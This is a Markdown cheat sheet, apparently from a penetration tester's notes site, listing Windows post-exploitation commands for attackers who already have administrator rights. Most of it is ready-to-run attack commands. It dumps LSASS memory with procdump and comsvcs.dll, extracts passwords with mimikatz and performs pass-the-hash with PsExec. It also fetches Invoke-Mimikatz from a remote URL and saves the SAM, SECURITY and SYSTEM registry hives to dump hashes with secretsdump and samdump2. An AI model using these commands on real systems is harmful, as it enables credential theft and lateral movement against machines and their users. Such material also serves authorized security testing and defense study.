---
layout: default
title: Windows Post-Admin
tags:
    - administrator
    - certificates private keys
    - credentials
    - in memory
    - kerberos tickets
    - local security authority subsystem service
    - LSASS
    - mimikatz
    - pass-the-hash
    - passwords
    - procdump
    - root
    - nt\system
---
# Windows Post-Admin
## Mimikatz
### Offline
Dump LSASS
```powershell
procdump.exe -ma lsass.exe <output path>  # use -r flag to avoid reading lsass by dumping a clone
.\rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 624 <output path> full  # uses native comsvcs.dll
```
- Alternatively can use task manager (Processes > lsass.exe > Create Dump File)

Extract Passwords
```shell
sekurlsa::minidump <dump path>
sekurlsa::logonpasswords
```

### On Target Machine
Extracting Passwords
```shell
privilege:debug
sekurlsa::logonPasswords
```

Pass-the-Hash
```powershell
sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<ntlm hash>  # Hash from previous password extraction
PsExec.exe \\<domain> cmd.exe  # Spawn cmd prompt on given domain
```

### On Target Machine (PowerShell Version) 
Get script onto target machine ([Invoke-Mimikatz.ps1](https://github.com/clymb3r/PowerShell/blob/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1))
```powershell
Invoke-WebRequest -UseBasicParsing <url> -Verbose                               # In-memory
Invoke-WebRequest -UseBasicParsing <url> -OutFile Invoke-Mimikatz.ps1 -Verbose  # Save to disk
```

Extact passwords, etc.
```powershell
Get-Help Invoke-Mimikatz
.\Invoke-Mimikatz -DumpCreds
Invoke-Mimikatz -ComputerName
```

## Registry Dump
Dump SAM, SECURITY and SYSTEM registry hives
```powershell
reg.exe save hklm\sam <output path>
reg.exe save hklm\security <output path>
reg.exe save hklm\system <output path>
```

Dump hashes on local machine
```shell
secretsdump.py -sam <sam> -security <security> -system <system> LOCAL  # Impacket
samdump2 <system> <sam>
```
